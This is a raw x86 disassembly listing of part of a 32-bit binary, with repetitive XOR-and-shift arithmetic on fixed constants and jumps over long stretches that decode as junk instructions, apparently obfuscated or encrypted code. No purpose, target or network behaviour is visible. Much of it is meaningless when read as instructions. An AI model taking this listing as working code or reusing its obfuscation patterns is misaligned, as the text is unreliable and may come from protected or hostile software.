  407e1e:	xor    eax,edi
  407e20:	shl    ecx,0x1e
  407e23:	xor    edx,edx
  407e25:	or     eax,edx
  407e27:	add    eax,DWORD PTR ds:0x422738
  407e2d:	mov    DWORD PTR [ebp+0x14],eax
  407e30:	mov    eax,DWORD PTR [ebp+0x8]
  407e33:	mov    ecx,DWORD PTR [ebp+0xc]
  407e36:	shrd   eax,ecx,0x2
  407e3a:	shr    ecx,0x2
  407e3d:	mov    ecx,DWORD PTR [ebp+0x8]
  407e40:	mov    edx,DWORD PTR [ebp+0xc]
  407e43:	xor    eax,edi
  407e45:	shl    ecx,0x1e
  407e48:	xor    edx,edx
  407e4a:	or     eax,edx
  407e4c:	mov    cl,BYTE PTR [ebp+eax*1-0x4]
  407e50:	mov    eax,DWORD PTR [ebp+0x14]
  407e53:	xor    BYTE PTR [eax],cl
  407e55:	mov    eax,DWORD PTR [ebp-0x60]
  407e58:	mov    ecx,DWORD PTR [ebp-0x5c]
  407e5b:	shrd   eax,ecx,0x2
  407e5f:	shr    ecx,0x2
  407e62:	mov    ecx,DWORD PTR [ebp-0x60]
  407e65:	mov    edx,DWORD PTR [ebp-0x5c]
  407e68:	xor    eax,edi
  407e6a:	shl    ecx,0x1e
  407e6d:	xor    edx,edx
  407e6f:	or     eax,edx
  407e71:	add    eax,DWORD PTR ds:0x422738
  407e77:	mov    DWORD PTR [ebp+0x14],eax
  407e7a:	mov    eax,DWORD PTR [ebp-0x60]
  407e7d:	mov    ecx,DWORD PTR [ebp-0x5c]
  407e80:	shrd   eax,ecx,0x2
  407e84:	shr    ecx,0x2
  407e87:	mov    ecx,DWORD PTR [ebp-0x60]
  407e8a:	mov    edx,DWORD PTR [ebp-0x5c]
  407e8d:	xor    eax,edi
  407e8f:	shl    ecx,0x1e
  407e92:	xor    edx,edx
  407e94:	or     eax,edx
  407e96:	mov    cl,BYTE PTR [ebp+eax*1-0x4]
  407e9a:	mov    eax,DWORD PTR [ebp+0x14]
  407e9d:	or     BYTE PTR [eax],cl
  407e9f:	mov    eax,DWORD PTR [ebp-0x48]
  407ea2:	mov    ecx,DWORD PTR [ebp-0x44]
  407ea5:	shrd   eax,ecx,0x2
  407ea9:	shr    ecx,0x2
  407eac:	mov    ecx,DWORD PTR [ebp-0x48]
  407eaf:	mov    edx,DWORD PTR [ebp-0x44]
  407eb2:	xor    eax,edi
  407eb4:	jmp    0x408255
  407eb9:	out    0x23,al
  407ebb:	pop    ss
  407ebc:	jns    0x407ed9
  407ebe:	jns    0x407e6b
  407ec0:	mov    bl,0xaa
  407ec2:	repz ror edi,0xa2
  407ec6:	shl    DWORD PTR [esi+ebx*4-0x42],0x65
  407ecb:	mov    esi,0xbec4bdbe
  407ed0:	mov    esi,0x894de587
  407ed5:	xchg   edx,eax
  407ed6:	push   ds
  407ed7:	mov    esp,0x6020220b
  407edc:	addr16 inc eax
  407ede:	jg     0x407e61
  407ee0:	xchg   ebp,eax
  407ee1:	(bad)  
  407ee2:	lods   eax,DWORD PTR ds:[esi]
  407ee3:	jge    0x407f25
  407ee5:	sti    
  407ee6:	out    dx,eax
  407ee7:	lahf   
  407ee8:	fisttp WORD PTR [eax-0x63]
  407eeb:	cwde   
  407eec:	and    BYTE PTR [esi],bh
  407eee:	sbb    al,BYTE PTR [edi-0x302e6f04]
  407ef4:	out    0xa8,al
  407ef6:	push   ebx
  407ef7:	fisubr DWORD PTR [edi+0x1a327935]
  407efd:	xor    eax,0x11d68ad5
  407f02:	outs   dx,DWORD PTR ds:[esi]
  407f03:	aaa    
  407f04:	ffreep st(0)
  407f06:	ins    DWORD PTR es:[edi],dx
  407f07:	mov    bh,0x4c
  407f09:	shl    BYTE PTR [esi],1
  407f0b:	adc    dh,ch
  407f0d:	xor    eax,0xa7b6c398
  407f12:	xor    BYTE PTR [ecx+0x1f],ah
  407f15:	pop    ebp
  407f16:	adc    DWORD PTR [esi],edx
  407f18:	dec    ecx
  407f19:	or     edi,DWORD PTR [edi-0xf5bd971]
  407f1f:	iret   
  407f20:	addr16 pop esi
  407f22:	push   0x70
  407f24:	loope  0x407f73
  407f26:	stc    
  407f27:	mov    eax,ds:0x4492924
  407f2c:	cmp    al,0xa5
  407f2e:	test   BYTE PTR [eax+0x3ee60690],ch
  407f34:	xchg   esp,eax
  407f35:	mov    al,0x41
  407f37:	cmp    ch,BYTE PTR [edx+0x5abcc2b6]
  407f3d:	repz pushf 
  407f3f:	mov    ebx,0x8e5b180e
  407f44:	imul   edx,ebx,0xd
  407f47:	rcl    DWORD PTR [ecx],1
  407f49:	retf   
  407f4a:	in     al,dx
  407f4b:	repnz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407f4d:	jp     0x407fcb
  407f4f:	jno    0x407f22
  407f51:	sub    DWORD PTR [edi+0x5b],0x6f9c348e
  407f58:	dec    edx
  407f59:	aam    0xe4
  407f5b:	arpl   sp,cx
  407f5d:	arpl   WORD PTR [ecx],si
  407f5f:	test   DWORD PTR [edx-0x50],0x1ab67252
  407f66:	loop   0x407fa4
  407f68:	jae    0x407fb2
  407f6a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407f6b:	xor    BYTE PTR [ecx-0x60],0x4d
  407f6f:	(bad)  
  407f70:	xlat   BYTE PTR ds:[ebx]
  407f71:	fcomp  QWORD PTR [edx-0x3a1c4e65]
  407f77:	bound  edi,QWORD PTR [edi+0x7]
  407f7a:	xchg   ecx,eax
  407f7b:	jno    0x407fac
  407f7d:	xchg   ebx,eax
  407f7e:	out    dx,eax
  407f7f:	fstp   DWORD PTR [ecx+0x1ca8edcf]
  407f85:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407f86:	(bad)  
  407f87:	cs inc eax
  407f89:	pusha  
  407f8a:	inc    BYTE PTR ds:0xaefb79d7
  407f90:	sub    al,0x9
  407f92:	jb     0x407ffe
  407f94:	lahf   
  407f95:	xor    al,0x29
  407f97:	addr16 adc al,0x4f
  407f9a:	dec    edx
  407f9b:	adc    edx,DWORD PTR [edi]
  407f9d:	fisubr WORD PTR [ebp-0x5c3ac1bb]
  407fa3:	popf   
  407fa4:	xchg   dl,dh
  407fa6:	sbb    BYTE PTR [ebp-0x2b0fa21a],bl
  407fac:	dec    esi
  407fad:	pop    ebx
  407fae:	leave  
  407faf:	inc    eax
  407fb0:	mov    ebp,0x3e270c61
  407fb5:	jle    0x407f4a
  407fb7:	fld    QWORD PTR [eax-0x29]
  407fba:	inc    esp
  407fbb:	ja     0x407f57
  407fbd:	pop    ds
  407fbe:	in     al,dx
  407fbf:	sbb    DWORD PTR [ebp+eiz*4+0xa68d827],edi
  407fc6:	stc    
  407fc7:	sub    al,0xc3
  407fc9:	pusha  
  407fca:	mov    al,0x2d
  407fcc:	mov    ds:0x632eb543,al
  407fd1:	xchg   esi,eax
  407fd2:	push   0x56
  407fd4:	push   edi
  407fd5:	push   0xa1ab622e
  407fda:	out    dx,eax
  407fdb:	jg     0x407f97
  407fdd:	mov    esp,?
  407fdf:	in     eax,0x2b
  407fe1:	push   ebx
  407fe2:	imul   edi,DWORD PTR ds:0xc069e7c0,0xf44d3b0f
  407fec:	scas   al,BYTE PTR es:[edi]
  407fed:	out    dx,eax
  407fee:	mov    bl,0xa9
  407ff0:	dec    ecx
  407ff1:	adc    BYTE PTR [ebx],cl
  407ff3:	sbb    al,0xc9
  407ff5:	fnsave [ecx+0x67f31ac5]
  407ffb:	jae    0x407fc8
  407ffd:	imul   eax,esi,0x10babb5a
  408003:	jge    0x408045
  408005:	cli    
  408006:	push   0x6ddd0ff2
  40800b:	rcl    ah,cl
  40800d:	mov    eax,0x9b52b760
  408012:	stos   DWORD PTR es:[edi],eax
  408013:	fcom   QWORD PTR [edi]
  408015:	mov    dh,0x3a
  408017:	cmp    BYTE PTR [ecx+0x46],dl
  40801a:	es mov esi,0x8db37222
  408020:	jecxz  0x40809b
  408022:	sub    BYTE PTR [ebx+0xf230741],ah
  408028:	xchg   esi,eax
  408029:	inc    esp
  40802a:	sbb    BYTE PTR [edx+0x7f469c1b],ch
  408030:	jg     0x4080ac
  408032:	mov    dh,0xcc
  408034:	adc    esp,DWORD PTR [ecx]
  408036:	sti    
  408037:	add    al,0x51
  408039:	mov    ds:0xcda6d709,eax
  40803e:	cmp    esp,edx
  408040:	sub    cl,BYTE PTR [ebp+esi*4+0x1e]
  408044:	mov    eax,0xf70d469b
  408049:	dec    esp
  40804a:	loop   0x40805a
  40804c:	cmp    BYTE PTR [esi-0x6],al
  40804f:	(bad)
  408054:	xor    cl,BYTE PTR [edx+0xce74077]
  40805a:	and    eax,0x98f05208
  40805f:	iret   
  408060:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408061:	jmp    0xd036:0x77009577
  408068:	fimul  WORD PTR [edx]
  40806a:	push   esp
  40806b:	popa   
  40806c:	lea    edx,[ecx+0xe59a5f8]
  408072:	mov    ebp,0xa537b165
  408077:	test   dl,0x87
  40807a:	push   ebx
  40807b:	dec    edi
  40807c:	ror    DWORD PTR [esi],cl
  40807e:	cmp    dl,BYTE PTR [edi]
  408080:	push   ebp
  408081:	xchg   edi,eax
  408082:	mov    bl,0xd6
  408084:	retf   0xa944
  408087:	(bad)  
  408088:	xor    BYTE PTR ss:[ebx+ecx*2],cl
  40808c:	aaa    
  40808d:	mov    bh,0x23
  40808f:	pop    ds
  408090:	rol    BYTE PTR [edx+ebp*8+0x1ad30dcb],1
  408097:	jl     0x40810e
  408099:	retf   
  40809a:	pop    ebp
  40809b:	mov    dl,0x1b
  40809d:	cmovs  edx,DWORD PTR [esi-0x78]
  4080a1:	cmc    
  4080a2:	in     al,0x6f
  4080a4:	mov    ecx,DWORD PTR [edx+0x444a6a8c]
  4080aa:	arpl   WORD PTR [ecx-0x69],cx
  4080ad:	inc    esi
  4080ae:	xor    BYTE PTR [ebx-0x1d],dh
  4080b1:	mov    dl,0x41
  4080b3:	and    bl,al
  4080b5:	xchg   DWORD PTR [edx],esi
  4080b7:	ja     0x408123
  4080b9:	pop    ds
  4080ba:	sbb    al,0x43
  4080bc:	adc    DWORD PTR [ebp+0x63],ebx
  4080bf:	retf   
  4080c0:	pop    ecx
  4080c1:	xor    BYTE PTR [ebx-0xc],dl
  4080c4:	ret    
  4080c5:	nop
  4080c6:	inc    edi
  4080c7:	iret   
  4080c8:	jmp    0x2ef4:0x359eed26
  4080cf:	push   esi
  4080d0:	je     0x40811a
  4080d2:	push   esi
  4080d3:	jb     0x40808b
  4080d5:	mov    esi,0x40394466
  4080da:	or     edx,DWORD PTR [edi]
  4080dc:	rcr    cl,0xdd
  4080df:	mov    ebx,0xe9717c50
  4080e4:	mov    ebx,0xfcb18b2
  4080e9:	jb     0x408098
  4080eb:	les    edi,FWORD PTR [ebp-0x10]
  4080ee:	sbb    BYTE PTR [edi-0x757b98fe],0x38
  4080f5:	out    0xf0,eax
  4080f7:	push   ebx
  4080f8:	jae    0x408096
  4080fa:	std    
  4080fb:	fisttp WORD PTR fs:[ebx+0x3ed3097f]
  408102:	test   BYTE PTR [edx],ah
  408104:	dec    edi
  408105:	jp     0x4080fa
  408107:	jecxz  0x40813c
  408109:	shl    BYTE PTR [ebx+0x3ff5ebdf],0x7a
  408110:	sub    esp,DWORD PTR [edi]
  408112:	inc    ebp
  408113:	scas   al,BYTE PTR es:[edi]
  408114:	scas   al,BYTE PTR es:[edi]
  408115:	pop    es
  408116:	les    ecx,FWORD PTR [ecx+eiz*4+0x7c]
  40811a:	out    dx,al
  40811b:	test   eax,0xfdbf27bd
  408120:	(bad)  
  408121:	in     al,0xc
  408123:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408124:	(bad)  
  408125:	outs   dx,BYTE PTR ds:[esi]
  408126:	clc    
  408127:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408128:	mov    al,bl
  40812a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40812b:	addr16 mov ebx,0x12f120aa
  408131:	mov    ds:0x6ecf4277,al
  408136:	icebp  
  408137:	mov    ch,BYTE PTR [ebp-0x70e1ce5e]
  40813d:	cmp    BYTE PTR es:[edx-0x54bc6b4],0x90
  408145:	inc    edx
  408146:	out    0x9f,al
  408148:	aam    0x9e
  40814a:	addr16 loope 0x40810d
  40814d:	std    
  40814e:	xlat   BYTE PTR ds:[ebx]
  40814f:	loope  0x4080ea
  408151:	data16 shl BYTE PTR [esi],cl
  408154:	cmp    DWORD PTR [eiz*8+0x195c6f91],edx
  40815b:	stos   BYTE PTR es:[edi],al
  40815c:	and    ah,BYTE PTR ds:0x4087b18b
  408162:	stos   BYTE PTR es:[edi],al
  408163:	ss inc esp
  408165:	jo     0x408181
  408167:	les    ecx,FWORD PTR [ebp+0x9]
  40816a:	sar    BYTE PTR [edx+esi*1],1
  40816d:	mov    DWORD PTR [ecx],edi
  40816f:	retf   0xc966
  408172:	add    BYTE PTR [ebx+edx*8],dl
  408175:	sti    
  408176:	push   es
  408177:	cmp    eax,0xe30bf22d
  40817c:	xchg   ebx,eax
  40817d:	jg     0x4081d0
  40817f:	or     eax,0x2ff0219c
  408184:	jl     0x40811e
  408186:	aad    0x90
  408188:	in     eax,0xc7
  40818a:	in     al,0x9c
  40818c:	dec    BYTE PTR [esi]
  40818e:	xchg   edi,eax
  40818f:	lea    esi,[edx+0x30]
  408192:	push   cs
  408193:	adc    al,0x11
  408195:	lahf   
  408196:	mov    ds:0x1af473e8,eax
  40819b:	dec    esi
  40819c:	mov    ebx,0xc5b5759f
  4081a1:	enter  0x8491,0x3f
  4081a5:	test   eax,0xd76b8f7a
  4081aa:	dec    ebx
  4081ab:	cmp    al,BYTE PTR [edx+0x12]
  4081ae:	gs pop ebx
  4081b0:	arpl   WORD PTR [eax],bx
  4081b2:	sub    eax,0x2961071a
  4081b7:	push   ebp
  4081b8:	xchg   ebp,eax
  4081b9:	fstp   DWORD PTR [eax+edi*2-0x37891f32]
  4081c0:	aas    
  4081c1:	neg    DWORD PTR [edx+0x6c1d1c26]
  4081c7:	mov    BYTE PTR [ecx],0xf9
  4081ca:	or     ch,BYTE PTR [ebx+0x23]
  4081cd:	pop    ds
  4081ce:	add    BYTE PTR ds:0xafe7f08f,dh
  4081d4:	or     bh,cl
  4081d6:	jge    0x40819d
  4081d8:	loop   0x408239
  4081da:	or     BYTE PTR [esp+edx*1+0x57a7a899],cl
  4081e1:	push   esi
  4081e2:	sar    ebx,cl
  4081e4:	js     0x408197
  4081e6:	lock jl 0x408212
  4081e9:	cmp    DWORD PTR [edx-0x48],ecx
  4081ec:	ins    BYTE PTR es:[edi],dx
  4081ed:	movaps xmm3,XMMWORD PTR [esi]
  4081f0:	push   edi
  4081f1:	es leave 
  4081f3:	repnz loopne 0x408181
  4081f6:	sahf   
  4081f7:	ins    DWORD PTR es:[edi],dx
  4081f8:	jne    0x408249
  4081fa:	sbb    al,BYTE PTR [edx]
  4081fc:	push   es
  4081fd:	and    DWORD PTR [edx+0x41ca0eff],ebx
  408203:	sbb    cl,ch
  408205:	push   ecx
  408206:	jae    0x4081e7
  408208:	aam    0xd1
  40820a:	adc    eax,0x5db75203
  40820f:	test   BYTE PTR [edi+esi*2+0x72],dh
  408213:	dec    BYTE PTR [eax+0x46]
  408216:	sbb    al,0x8
  408218:	cmc    
  408219:	jno    0x4081ba
  40821b:	xchg   edx,eax
  40821c:	nop
  40821d:	cli    
  40821e:	xchg   ecx,eax
  40821f:	stc    
  408220:	xchg   ebx,eax
  408221:	(bad)  
  408224:	stos   BYTE PTR es:[edi],al
  408225:	add    DWORD PTR [esi+0x4c],ebx
  408228:	push   0x47
  40822a:	push   ebx
  40822b:	inc    ebp
  40822c:	ret    
  40822d:	arpl   WORD PTR [edx],di
  40822f:	test   eax,0xe411d550
  408234:	in     eax,0x32
  408236:	js     0x40829c
  408238:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408239:	test   BYTE PTR [edi+ebp*2-0xd8f8569],dh
  408240:	js     0x40822e
  408242:	es jle 0x408243
  408245:	xor    eax,0x7a44e723
  40824a:	ret    
  40824b:	jo     0x4082c3
  40824d:	inc    ebp
  40824e:	in     al,0xe2
  408250:	pop    ecx
  408251:	sub    BYTE PTR [eax],0xce
  408254:	nop
  408255:	xor    edx,edx
  408257:	or     eax,edx
  408259:	add    eax,DWORD PTR ds:0x422738
  40825f:	shl    ecx,0x1e
  408262:	mov    DWORD PTR [ebp+0x14],eax
  408265:	mov    eax,DWORD PTR [ebp-0x48]
  408268:	mov    ecx,DWORD PTR [ebp-0x44]
  40826b:	shrd   eax,ecx,0x2
  40826f:	shr    ecx,0x2
  408272:	mov    ecx,DWORD PTR [ebp-0x48]
  408275:	mov    edx,DWORD PTR [ebp-0x44]
  408278:	xor    eax,edi
  40827a:	shl    ecx,0x1e
  40827d:	xor    edx,edx
  40827f:	or     eax,edx
  408281:	mov    cl,BYTE PTR [ebp+eax*1-0x4]
  408285:	mov    eax,DWORD PTR [ebp+0x14]
  408288:	add    BYTE PTR [eax],cl
  40828a:	mov    eax,DWORD PTR [ebp-0x38]
  40828d:	mov    ecx,DWORD PTR [ebp-0x34]
  408290:	shrd   eax,ecx,0x2
  408294:	xor    eax,edi
  408296:	shr    ecx,0x2
  408299:	mov    ecx,DWORD PTR [ebp-0x38]
  40829c:	mov    edx,DWORD PTR [ebp-0x34]
  40829f:	shl    ecx,0x1e
  4082a2:	mov    ecx,DWORD PTR [ebp-0x38]
  4082a5:	xor    edx,edx
  4082a7:	or     eax,edx
  4082a9:	mov    edx,DWORD PTR [ebp-0x34]
  4082ac:	add    eax,DWORD PTR ds:0x422738
  4082b2:	shrd   ecx,edx,0x2
  4082b6:	xor    ecx,edi
  4082b8:	shr    edx,0x2
  4082bb:	mov    edx,DWORD PTR [ebp-0x38]
  4082be:	mov    edi,DWORD PTR [ebp-0x34]
  4082c1:	xor    edi,edi
  4082c3:	or     ecx,edi
  4082c5:	mov    cl,BYTE PTR [ebp+ecx*1-0x4]
  4082c9:	or     BYTE PTR [eax],cl
  4082cb:	mov    eax,DWORD PTR [esi]
  4082cd:	mov    ecx,DWORD PTR [esi+0x4]
  4082d0:	shl    eax,0x1e
  4082d3:	shl    edx,0x1e
  4082d6:	mov    edx,DWORD PTR [esi]
  4082d8:	mov    edi,DWORD PTR [esi+0x4]
  4082db:	xor    edi,0x9c2b8ae8
  4082e1:	xor    eax,0x80000000
  4082e6:	mov    DWORD PTR [ebp+0x14],eax
  4082e9:	mov    eax,0xcb79b577
  4082ee:	xor    edx,eax
  4082f0:	shrd   edx,edi,0x2
  4082f4:	shr    edi,0x2
  4082f7:	or     edi,DWORD PTR [ebp+0x14]
  4082fa:	xor    ecx,ecx
  4082fc:	or     edx,ecx
  4082fe:	mov    ecx,DWORD PTR [ebx]
  408300:	mov    DWORD PTR [ebp-0x64],edi
  408303:	mov    edi,DWORD PTR [ebx+0x4]
  408306:	mov    edi,ecx
  408308:	xor    ecx,ecx
  40830a:	shl    edi,0x1e
  40830d:	xor    edi,0x80000000
  408313:	mov    DWORD PTR [ebp+0x10],ecx
  408316:	mov    ecx,DWORD PTR [ebx]
  408318:	mov    DWORD PTR [ebp+0x14],edi
  40831b:	mov    edi,DWORD PTR [ebx+0x4]
  40831e:	xor    ecx,eax
  408320:	xor    edi,0x9c2b8ae8
  408326:	shrd   ecx,edi,0x2
  40832a:	or     ecx,DWORD PTR [ebp+0x10]
  40832d:	shr    edi,0x2
  408330:	mov    DWORD PTR [ebp-0x70],ecx
  408333:	mov    ecx,edi
  408335:	or     ecx,DWORD PTR [ebp+0x14]
  408338:	mov    DWORD PTR [ebp+0xc],edi
  40833b:	cmp    edx,DWORD PTR [ebp-0x70]
  40833e:	jne    0x408bb3
  408344:	cmp    DWORD PTR [ebp-0x64],ecx
  408347:	jne    0x408bb3
  40834d:	jmp    0x4083eb
  408352:	mov    eax,DWORD PTR [esi]
  408354:	mov    edx,DWORD PTR [esi+0x4]
  408357:	mov    eax,DWORD PTR [esi]
  408359:	mov    edx,DWORD PTR [esi+0x4]
  40835c:	mov    edx,eax
  40835e:	xor    eax,eax
  408360:	shl    edx,0x1e
  408363:	mov    DWORD PTR [ebp+0x10],eax
  408366:	mov    eax,DWORD PTR [esi]
  408368:	xor    edx,0x80000000
  40836e:	mov    DWORD PTR [ebp+0x14],edx
  408371:	mov    edx,DWORD PTR [esi+0x4]
  408374:	xor    eax,0xcb79b577
  408379:	xor    ecx,edx
  40837b:	shrd   eax,ecx,0x2
  40837f:	or     eax,DWORD PTR [ebp+0x10]
  408382:	shr    ecx,0x2
  408385:	mov    DWORD PTR [ebp+0x8],eax
  408388:	mov    eax,ecx
  40838a:	or     eax,DWORD PTR [ebp+0x14]
  40838d:	mov    ecx,DWORD PTR [ebx]
  40838f:	mov    edx,DWORD PTR [ebx+0x4]
  408392:	push   eax
  408393:	push   DWORD PTR [ebp+0x8]
  408396:	push   edx
  408397:	push   ecx
  408398:	call   0x41594e
  40839d:	mov    eax,DWORD PTR [esi]
  40839f:	mov    ecx,DWORD PTR [esi+0x4]
  4083a2:	shrd   eax,ecx,0x2
  4083a6:	shr    ecx,0x2
  4083a9:	shr    edx,0x1e
  4083ac:	xor    ecx,0xe70ae2ba
  4083b2:	push   ecx
  4083b3:	xor    eax,edi
  4083b5:	mov    DWORD PTR [ebp+0x10],edx
  4083b8:	mov    edx,DWORD PTR [ebx]
  4083ba:	mov    edi,DWORD PTR [ebx+0x4]
  4083bd:	push   eax
  4083be:	push   edi
  4083bf:	push   edx
  4083c0:	call   0x41594e
  4083c5:	shld   edx,eax,0x2
  4083c9:	shl    eax,0x2
  4083cc:	mov    ecx,eax
  4083ce:	or     ecx,DWORD PTR [ebp+0x10]
  4083d1:	xor    eax,eax
  4083d3:	or     edx,eax
  4083d5:	xor    ecx,0xcb79b576
  4083db:	xor    edx,0x9c2b8ae8
  4083e1:	mov    DWORD PTR [esi],ecx
  4083e3:	mov    DWORD PTR [esi+0x4],edx
  4083e6:	mov    eax,0xcb79b577
  4083eb:	mov    ecx,DWORD PTR [esi]
  4083ed:	mov    edx,DWORD PTR [esi+0x4]
  4083f0:	mov    edx,ecx
  4083f2:	shl    edx,0x1e
  4083f5:	xor    edx,0x80000000
  4083fb:	mov    DWORD PTR [ebp+0x14],edx
  4083fe:	mov    edx,DWORD PTR [esi]
  408400:	mov    edi,DWORD PTR [esi+0x4]
  408403:	xor    edi,0x9c2b8ae8
  408409:	xor    edx,eax
  40840b:	shrd   edx,edi,0x2
  40840f:	shr    edi,0x2
  408412:	or     edi,DWORD PTR [ebp+0x14]
  408415:	xor    ecx,ecx
  408417:	or     edx,ecx
  408419:	mov    ecx,DWORD PTR [ebx]
  40841b:	mov    DWORD PTR [ebp+0xc],edi
  40841e:	mov    edi,DWORD PTR [ebx+0x4]
  408421:	mov    edi,ecx
  408423:	xor    ecx,ecx
  408425:	shl    edi,0x1e
  408428:	mov    DWORD PTR [ebp+0x10],ecx
  40842b:	mov    ecx,DWORD PTR [ebx]
  40842d:	xor    edi,0x80000000
  408433:	mov    DWORD PTR [ebp+0x14],edi
  408436:	mov    edi,DWORD PTR [ebx+0x4]
  408439:	xor    eax,ecx
  40843b:	jmp    0x4087dc
  408440:	xor    eax,0x7b36559b
  408445:	cmp    al,0xb6
  408447:	pushf  
  408448:	pop    eax
  408449:	out    dx,eax
  40844a:	push   0xffffffd1
  40844c:	pop    eax
  40844d:	scas   al,BYTE PTR es:[edi]
  40844e:	xor    bl,ch
  408450:	mov    ebp,0xbdbebe6b
  408455:	les    edi,FWORD PTR [esi-0x674a1142]
  40845b:	mov    WORD PTR [ebp-0x5784d928],gs
  408461:	aaa    
  408462:	add    BYTE PTR [edi],0x47
  408465:	hlt    
  408466:	ss jns 0x4084b9
  408469:	fwait
  40846a:	stos   DWORD PTR es:[edi],eax
  40846b:	xchg   BYTE PTR [eax],ah
  40846d:	leave  
  40846e:	test   eax,0xeb2667b1
  408473:	imul   ebp,edx,0xfb087323
  408479:	inc    eax
  40847a:	addr16 sub al,0xe7
  40847d:	sahf   
  40847e:	lds    edi,FWORD PTR [ebp+0x507b103d]
  408484:	mov    ebx,0xbc4d2cf
  408489:	iret   
  40848a:	(bad)  
  40848b:	pop    edx
  40848c:	xlat   BYTE PTR ds:[ebx]
  40848d:	ret    
  40848e:	ret    
  40848f:	leave  
  408490:	jb     0x408413
  408492:	pop    DWORD PTR [ecx]
  408494:	jg     0x4084aa
  408496:	and    BYTE PTR [edi+edx*2-0x51263136],dl
  40849d:	sub    ecx,DWORD PTR [ecx-0x41]
  4084a0:	xchg   ecx,eax
  4084a1:	pop    ebx
  4084a2:	call   0xba8ecdf8
  4084a7:	and    edi,eax
  4084a9:	ret    0x4e6d
  4084ac:	lea    ebp,[edx]
  4084ae:	pop    esp
  4084b0:	sub    eax,0x8cf38596
  4084b5:	sub    al,0x4a
  4084b7:	or     BYTE PTR [edx-0x641f7e3e],al
  4084bd:	fsubr  QWORD PTR [edi*4+0x50870876]
  4084c4:	ja     0x408536
  4084c6:	stos   BYTE PTR es:[edi],al
  4084c7:	mov    eax,ds:0xd1a14992
  4084cc:	pushf  
  4084cd:	dec    ebx
  4084ce:	sbb    ebx,DWORD PTR [ebp-0x64]
  4084d1:	xchg   esi,eax
  4084d2:	mov    al,ds:0x3a4ab5ac
  4084d7:	xchg   ah,ah
  4084d9:	rep outs dx,BYTE PTR ds:[esi]
  4084db:	push   0xe0c7c08f
  4084e0:	js     0x408485
  4084e2:	sbb    DWORD PTR [eax+0x7beaa495],ebx
  4084e8:	repz xor al,0x60
  4084eb:	inc    edx
  4084ec:	ins    DWORD PTR es:[edi],dx
  4084ed:	(bad)  
  4084ee:	and    al,0xe4
  4084f0:	push   es
  4084f1:	lock pop ss
  4084f3:	and    DWORD PTR ss:[eax+0x38],esi
  4084f7:	int3   
  4084f8:	jb     0x408522
  4084fa:	shl    BYTE PTR [ecx-0x7d],cl
  4084fd:	dec    edx
  4084fe:	out    0x2b,al
  408500:	mov    al,ds:0x59b116d1
  408505:	fisub  WORD PTR [eax]
  408507:	jmp    0xcc54538b
  40850c:	ficom  DWORD PTR [esi-0x7a]
  40850f:	(bad)  
  408510:	jg     0x408585
  408512:	mov    BYTE PTR [ecx+0x1e37021d],dl
  408518:	mov    bl,BYTE PTR [ecx+0x4b84e8db]
  40851e:	xchg   ebp,eax
  40851f:	inc    eax
  408520:	sbb    bh,ah
  408522:	out    dx,eax
  408523:	sbb    esp,DWORD PTR [eax]
  408525:	(bad)  
  408526:	mov    ebx,0x80eaef30
  40852b:	ja     0x4084f8
  40852d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40852e:	scas   al,BYTE PTR es:[edi]
  40852f:	inc    ecx
  408530:	into   
  408531:	mov    ah,0x9e
  408533:	push   0x58
  408535:	aam    0xea
  408537:	xor    DWORD PTR [esp+esi*1+0x2c2d4d2c],0x3e
  40853f:	pop    ebx
  408540:	inc    ebx
  408541:	mov    cl,0x57
  408543:	mov    ebp,0xe3be9b00
  408548:	sub    DWORD PTR [eax+0x2c013083],0xf
  40854f:	dec    ebp
  408550:	push   ebp
  408551:	fcmove st,st(7)
  408553:	jne    0x408509
  408555:	xchg   ebx,eax
  408556:	mov    eax,0x50c51bf4
  40855b:	xchg   ebp,eax
  40855c:	(bad)  
  40855d:	cli    
  40855e:	push   edi
  40855f:	sbb    eax,0xb2dade02
  408564:	xchg   ecx,eax
  408565:	mov    cl,0x40
  408567:	shl    DWORD PTR [esi+0x66],1
  40856a:	scas   al,BYTE PTR es:[edi]
  40856b:	into   
  40856c:	cs loopne 0x4085b3
  40856f:	test   al,0xe1
  408571:	push   ds
  408572:	cmc    
  408573:	shl    bh,0x11
  408576:	fdiv   st,st(6)
  408578:	sub    DWORD PTR [edx-0x34],0x634d75e3
  40857f:	rcr    dl,1
  408581:	and    al,0x53
  408583:	inc    edx
  408584:	cmp    BYTE PTR [esi+eax*8+0x1618501c],ch
  40858b:	icebp  
  40858c:	inc    ebp
  40858d:	sub    ecx,DWORD PTR [ebp-0x6f]
  408590:	pop    ecx
  408591:	pusha  
  408592:	test   DWORD PTR [ebx+0x43cd1a03],ecx
  408598:	daa    
  408599:	jl     0x40855f
  40859b:	pop    es
  40859c:	pop    esp
  40859d:	sub    DWORD PTR [edx-0x6a1a92ea],ecx
  4085a3:	enter  0x5462,0xed
  4085a7:	sti    
  4085a8:	lods   al,BYTE PTR ds:[esi]
  4085a9:	jmp    0x841b:0xa5cad554
  4085b0:	in     al,0xc1
  4085b2:	cmp    edi,DWORD PTR [eax+0x2cc9a73b]
  4085b8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4085b9:	jmp    0x408591
  4085bb:	stc    
  4085bc:	mov    BYTE PTR [eax+0x24],bh
  4085bf:	push   es
  4085c0:	int    0x40
  4085c2:	gs add bh,0x1
  4085c6:	ror    bl,cl
  4085c8:	xchg   ch,ah
  4085ca:	fstp   QWORD PTR [edx+0x6b]
  4085cd:	aas    
  4085ce:	xor    al,0x8c
  4085d0:	out    0xff,al
  4085d2:	xchg   ebx,eax
  4085d3:	fadd   DWORD PTR [esi]
  4085d5:	pop    ebp
  4085d6:	in     al,0x28
  4085d8:	jl     0x408570
  4085da:	push   edi
  4085db:	lea    ecx,[ebx-0x5e166fa8]
  4085e1:	loopne 0x408643
  4085e3:	xchg   edx,eax
  4085e4:	and    eax,0xd0efc0df
  4085e9:	pop    esi
  4085ea:	sbb    ebx,0xb
  4085ed:	aas    
  4085ee:	les    ebp,FWORD PTR [ecx+0x7e]
  4085f1:	fs dec ebp
  4085f3:	mov    ds:0x364002ae,al
  4085f8:	pop    esi
  4085f9:	icebp  
